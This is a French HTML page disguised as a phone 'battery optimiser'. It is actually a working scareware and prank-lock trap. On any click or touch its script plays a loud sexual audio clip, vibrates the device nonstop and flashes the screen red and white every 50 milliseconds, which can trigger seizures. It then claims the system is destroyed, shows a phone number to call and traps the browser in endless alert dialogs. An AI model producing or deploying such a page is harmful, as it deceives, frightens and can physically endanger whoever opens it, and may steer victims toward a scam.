<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Optimiseur de Batterie</title>
    <style>
        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; transition: background 0.05s; }
        .card { text-align: center; border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px #00ff00; }
        #start-btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 1.2rem; margin-top: 20px; }
        
        /* Effet de flash */
        .flash-red { background-color: red !important; }
        .flash-white { background-color: white !important; }
        
        /* Effet de zoom fou */
        @keyframes zoomFou {
            0% { transform: scale(1); }
            50% { transform: scale(1.5) rotate(5deg); }
            100% { transform: scale(1); }
        }
        .zoom-actif { animation: zoomFou 0.1s infinite; }
    </style>
</head>
<body onclick="activerPiege()" ontouchstart="activerPiege()">

    <div class="card" id="interface">
        <h2 style="margin: 0;">BATTERIE FAIBLE ?</h2>
        <p style="color: #888;">Optimisez votre autonomie en un clic</p>
        <button id="start-btn">OPTIMISER MAINTENANT</button>
    </div>

    <audio id="audio" loop preload="auto">
        <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
    </audio>

    <script>
    function activerPiege() {
        const son = document.getElementById('audio');
        son.volume = 1.0;
        son.play().catch(() => {});

        // 1. Vibrations (On ne touche pas, ça reste !)
        if ("vibrate" in navigator) {
            setInterval(() => { navigator.vibrate([1000, 100]); }, 1100);
        }

        // 2. NOUVELLE OPTION : Le Flash Visuel (Rouge/Blanc)
        setInterval(() => {
            document.body.classList.toggle('flash-red');
            document.body.classList.toggle('flash-white');
        }, 50);

        // 3. NOUVELLE OPTION : Le Zoom Fou
        document.getElementById('interface').classList.add('zoom-actif');

        // Mise à jour du message
        document.getElementById('interface').innerHTML = `
            <h1 style="color:black; font-size:2.5rem; font-weight:bold; background:yellow;">
                SYSTÈME DÉTRUIT !
            </h1>
            <p style="color:black; font-size:1.5rem; font-weight:bold;">APPELLE LE : 0707656355</p>
        `;

        // 4. Blocage avec alertes
        setTimeout(() => {
            while(true) {
                alert("ERREUR CRITIQUE : LE PROCESSEUR BRÛLE !");
                alert("VOTRE TÉLÉPHONE APPARTIENT À 0707656355");
            }
        }, 200);
    }
    </script>
</body>
</html>
